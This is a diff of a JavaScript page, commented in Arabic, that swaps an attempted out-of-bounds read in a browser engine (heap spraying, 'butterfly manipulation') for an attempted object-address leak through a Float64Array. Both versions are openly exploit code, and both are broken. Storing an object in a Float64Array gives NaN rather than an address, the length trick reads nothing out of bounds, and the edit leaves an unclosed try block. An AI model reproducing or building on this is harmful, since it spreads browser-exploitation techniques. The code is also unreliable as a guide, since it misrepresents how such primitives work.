@@ -7,29 +7,25 @@
 
     try {
         // 1. إنشاء مصفوفة بها "فجوة" (Hole)
-        let arr = [1.1, 2.2, 3.3];
-        arr.length = 0x1000;
-        
-        // 2. استخدام "الرش" (Heap Spraying) لإجبار المصفوفة 
-        // على الامتداد فوق منطقة ذاكرة نتحكم فيها
-        let buffer = new ArrayBuffer(0x2000);
-        let floatView = new Float64Array(buffer);
-        
-        log("جاري التلاعب ببنود المصفوفة (Butterfly Manipulation)...");
-        
-        // 3. قراءة المنطقة المجاورة للمصفوفة مباشرة
-        // سنحاول قراءة "طول المصفوفة" (Length)
-        let length = arr.length;
-        log("طول المصفوفة المقروء: " + length);
-        
-        // إذا نجح التلاعب، يجب أن نرى طولاً مختلفاً عما حددناه
-        if (length > 0x1000) {
-            log("نجاح! تم تجاوز حدود الذاكرة (Out of Bounds Access)!");
-        }
+   // نستخدم مصفوفة كائنات ومصفوفة رقمية (Float64Array)
+// الهدف: جعل المحرك يقرأ "عنوان الكائن" كـ "قيمة Double"
+let obj = { a: 1 };
+let arr = [obj];
+let floatArr = new Float64Array(1);
 
-    } catch(e) {
-        log("خطأ في البنية: " + e.message);
-    }
+function get_addr(obj) {
+    // سنحاول وضع الكائن في مصفوفة، ثم قراءته من Float64Array
+    // ليعامل المؤشر كـ 64-bit float
+    arr[0] = obj;
+    floatArr[0] = arr[0];
+    
+    // إذا نجح الخداع، سيعيد لنا عنوان الكائن كقيمة رقمية (Hex)
+    return floatArr[0];
+}
+
+let leakedAddr = get_addr(obj);
+log("العنوان المسرب (Address Leak): " + leakedAddr.toString(16));
+
 </script>
 
 
